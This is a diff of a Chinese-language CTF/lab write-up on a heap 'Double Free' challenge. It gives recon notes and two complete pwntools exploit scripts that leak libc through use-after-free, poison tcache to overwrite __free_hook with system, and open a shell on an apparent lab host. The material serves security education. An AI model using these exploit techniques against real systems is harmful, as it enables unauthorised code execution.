@@ -9,11 +9,12 @@ date: 2024-01-31
 # Simple PWN 0x39(Lab - Double Free)
 <!-- more -->
 
+Run On Ubuntu 20.04
+
 ## Background
 [0x18(Lab - `babynote`)](https://hackmd.io/@SBK6401/rkD83kaji)
 
 ## Source code
-:::spoiler Source Code
 ```cpp
 #include <stdio.h>
 #include <stdlib.h>
@@ -134,12 +135,8 @@ int main(void)
 	return 0;
 }
 ```
-:::
 
 ## Recon
-:::warning
-Run On Ubuntu 20.04
-:::
 這一題有很多種方式可以拿到shell，不過原理都是一樣的，前置作業都是一樣的，也就是要利用UAF去leak出libc address，接著算出`__free_hook`以及`system`的位址，接著想辦法把`system`寫到`__free_hook`的位址，此時就有兩種方式可以寫，一種是利用此次學到的double free，把值寫到最後一個在tcache的free chunk，蓋掉他的fd，接著就可以用add_note把tcache的值要回來，並寫system的address進到__free_hook；另一種方式就比較簡單，也就是把free chunk的fd利用UAF的特性改掉，並且直接add_note把東西從tcache要回來，之後就一樣寫system_addr，後free掉一個帶有/bin/sh的chunk，此時就會開一個shell給我們了
 
 ### 前置作業: Leak Libc Address
@@ -230,162 +227,160 @@ write_note(1, p64(free_hook) + p64(0) * 2)
 從上圖得知，note #4的address已經被我們換成`__free_hook` address，並且實際跟進去就是system address，最後只要free掉note #2就可以開shell了
 
 ## Exploit - Leak Libc(UAF) + Double Free(?)
-:::spoiler Method 1
-```python
-from pwn import *
+* Method 1
+	```python
+	from pwn import *
 
-r = process('./chal')
-r = remote('10.113.184.121', 10058)
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
-context.arch = 'amd64'
+	r = process('./chal')
+	r = remote('10.113.184.121', 10058)
+	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+	context.arch = 'amd64'
 
-def add_note(idx, len):
-    r.recvuntil(b'choice: ')
-    r.send(b'1')
-    r.recvuntil(b'Index: ')
-    r.send(str(idx).encode())
-    r.recvuntil(b'Length: ')
-    r.send(str(len).encode())
+	def add_note(idx, len):
+		r.recvuntil(b'choice: ')
+		r.send(b'1')
+		r.recvuntil(b'Index: ')
+		r.send(str(idx).encode())
+		r.recvuntil(b'Length: ')
+		r.send(str(len).encode())
 
-def read_note(idx):
-    r.recvuntil(b'choice: ')
-    r.send(b'2')
-    r.recvuntil(b'Index: ')
-    r.send(str(idx).encode())
-    r.recvline()
+	def read_note(idx):
+		r.recvuntil(b'choice: ')
+		r.send(b'2')
+		r.recvuntil(b'Index: ')
+		r.send(str(idx).encode())
+		r.recvline()
 
-def write_note(idx, content):
-    r.recvuntil(b'choice: ')
-    r.send(b'3')
-    r.recvuntil(b'Index: ')
-    r.send(str(idx).encode())
-    r.recvuntil(b'Content: ')
-    r.send(content)
+	def write_note(idx, content):
+		r.recvuntil(b'choice: ')
+		r.send(b'3')
+		r.recvuntil(b'Index: ')
+		r.send(str(idx).encode())
+		r.recvuntil(b'Content: ')
+		r.send(content)
 
-def del_note(idx):
-    r.recvuntil(b'choice: ')
-    r.send(b'4')
-    r.recvuntil(b'Index: ')
-    r.send(str(idx).encode())
+	def del_note(idx):
+		r.recvuntil(b'choice: ')
+		r.send(b'4')
+		r.recvuntil(b'Index: ')
+		r.send(str(idx).encode())
 
-# Leak libc address
-add_note(12, 0x420)
-add_note(13, 0x420)
-add_note(14, 0x420)
-del_note(12)
-del_note(13)
-add_note(12, 0x420)
-read_note(12)
+	# Leak libc address
+	add_note(12, 0x420)
+	add_note(13, 0x420)
+	add_note(14, 0x420)
+	del_note(12)
+	del_note(13)
+	add_note(12, 0x420)
+	read_note(12)
 
-leak_libc = u64(r.recv(8))
-libc_base = leak_libc - 0x1ed0e0
-system_addr = libc_base + libc.symbols['system']
-free_hook = libc_base + 0x1eee48
-log.success(f'Leak Libc = {hex(leak_libc)}')
-log.success(f'Libc Base = {hex(libc_base)}')
-log.success(f'System Address = {hex(system_addr)}')
-log.success(f'Free Hook = {hex(free_hook)}')
-r.recv(0x420 - 0x8)
+	leak_libc = u64(r.recv(8))
+	libc_base = leak_libc - 0x1ed0e0
+	system_addr = libc_base + libc.symbols['system']
+	free_hook = libc_base + 0x1eee48
+	log.success(f'Leak Libc = {hex(leak_libc)}')
+	log.success(f'Libc Base = {hex(libc_base)}')
+	log.success(f'System Address = {hex(system_addr)}')
+	log.success(f'Free Hook = {hex(free_hook)}')
+	r.recv(0x420 - 0x8)
 
-## Use Double Free to Write system_addr to __free_hook
-for i in range(1, 0xa):
-    add_note(i, 0x10)
+	## Use Double Free to Write system_addr to __free_hook
+	for i in range(1, 0xa):
+		add_note(i, 0x10)
 
-for i in range(1, 0x8):
-    del_note(i)
+	for i in range(1, 0x8):
+		del_note(i)
 
-del_note(8)
-del_note(9)
-del_note(8)
+	del_note(8)
+	del_note(9)
+	del_note(8)
 
-### Clean tcache
-for i in range(1, 0x8):
-    add_note(i, 0x10)
-add_note(8, 0x18)
-write_note(8, p64(free_hook))
-bin_sh = u64(b'/bin/sh\x00')
-add_note(9, 0x10)
-write_note(9, p64(bin_sh))
-add_note(10, 0x10)
-add_note(11, 0x10)
-write_note(11, p64(system_addr))
-del_note(9)
+	### Clean tcache
+	for i in range(1, 0x8):
+		add_note(i, 0x10)
+	add_note(8, 0x18)
+	write_note(8, p64(free_hook))
+	bin_sh = u64(b'/bin/sh\x00')
+	add_note(9, 0x10)
+	write_note(9, p64(bin_sh))
+	add_note(10, 0x10)
+	add_note(11, 0x10)
+	write_note(11, p64(system_addr))
+	del_note(9)
 
-r.interactive()
-```
-:::
+	r.interactive()
+	```
 
-:::spoiler Method 2
-```python
-from pwn import *
+* Method 2
+	```python
+	from pwn import *
 
-r = process('./chal')
-r = remote('10.113.184.121', 10058)
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
-context.arch = 'amd64'
+	r = process('./chal')
+	r = remote('10.113.184.121', 10058)
+	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+	context.arch = 'amd64'
 
-def add_note(idx, len):
-    r.recvuntil(b'choice: ')
-    r.send(b'1')
-    r.recvuntil(b'Index: ')
-    r.send(str(idx).encode())
-    r.recvuntil(b'Length: ')
-    r.send(str(len).encode())
+	def add_note(idx, len):
+		r.recvuntil(b'choice: ')
+		r.send(b'1')
+		r.recvuntil(b'Index: ')
+		r.send(str(idx).encode())
+		r.recvuntil(b'Length: ')
+		r.send(str(len).encode())
 
-def read_note(idx):
-    r.recvuntil(b'choice: ')
-    r.send(b'2')
-    r.recvuntil(b'Index: ')
-    r.send(str(idx).encode())
-    r.recvline()
+	def read_note(idx):
+		r.recvuntil(b'choice: ')
+		r.send(b'2')
+		r.recvuntil(b'Index: ')
+		r.send(str(idx).encode())
+		r.recvline()
 
-def write_note(idx, content):
-    r.recvuntil(b'choice: ')
-    r.send(b'3')
-    r.recvuntil(b'Index: ')
-    r.send(str(idx).encode())
-    r.recvuntil(b'Content: ')
-    r.send(content)
+	def write_note(idx, content):
+		r.recvuntil(b'choice: ')
+		r.send(b'3')
+		r.recvuntil(b'Index: ')
+		r.send(str(idx).encode())
+		r.recvuntil(b'Content: ')
+		r.send(content)
 
-def del_note(idx):
-    r.recvuntil(b'choice: ')
-    r.send(b'4')
-    r.recvuntil(b'Index: ')
-    r.send(str(idx).encode())
+	def del_note(idx):
+		r.recvuntil(b'choice: ')
+		r.send(b'4')
+		r.recvuntil(b'Index: ')
+		r.send(str(idx).encode())
 
-# Leak libc address
-add_note(12, 0x420)
-add_note(13, 0x420)
-add_note(14, 0x420)
-del_note(12)
-del_note(13)
-add_note(12, 0x420)
-read_note(12)
+	# Leak libc address
+	add_note(12, 0x420)
+	add_note(13, 0x420)
+	add_note(14, 0x420)
+	del_note(12)
+	del_note(13)
+	add_note(12, 0x420)
+	read_note(12)
 
-leak_libc = u64(r.recv(8))
-libc_base = leak_libc - 0x1ed0e0
-system_addr = libc_base + libc.symbols['system']
-free_hook = libc_base + 0x1eee48
-log.success(f'Leak Libc = {hex(leak_libc)}')
-log.success(f'Libc Base = {hex(libc_base)}')
-log.success(f'System Address = {hex(system_addr)}')
-log.success(f'Free Hook = {hex(free_hook)}')
-r.recv(0x420 - 0x8)
+	leak_libc = u64(r.recv(8))
+	libc_base = leak_libc - 0x1ed0e0
+	system_addr = libc_base + libc.symbols['system']
+	free_hook = libc_base + 0x1eee48
+	log.success(f'Leak Libc = {hex(leak_libc)}')
+	log.success(f'Libc Base = {hex(libc_base)}')
+	log.success(f'System Address = {hex(system_addr)}')
+	log.success(f'Free Hook = {hex(free_hook)}')
+	r.recv(0x420 - 0x8)
 
-## Another Way to Write system_addr to __free_hook
-add_note(1, 0x18)
-add_note(2, 0x18)
-del_note(2)
-del_note(1)
-write_note(1, p64(free_hook) + p64(0) * 2)
-bin_sh = u64(b'/bin/sh\x00')
-write_note(2, p64(bin_sh))
-add_note(3, 0x18)
-add_note(4, 0x18)
-write_note(4, p64(system_addr))
-raw_input()
-del_note(2)
+	## Another Way to Write system_addr to __free_hook
+	add_note(1, 0x18)
+	add_note(2, 0x18)
+	del_note(2)
+	del_note(1)
+	write_note(1, p64(free_hook) + p64(0) * 2)
+	bin_sh = u64(b'/bin/sh\x00')
+	write_note(2, p64(bin_sh))
+	add_note(3, 0x18)
+	add_note(4, 0x18)
+	write_note(4, p64(system_addr))
+	raw_input()
+	del_note(2)
 
-r.interactive()
-```
-:::
+	r.interactive()
+	```
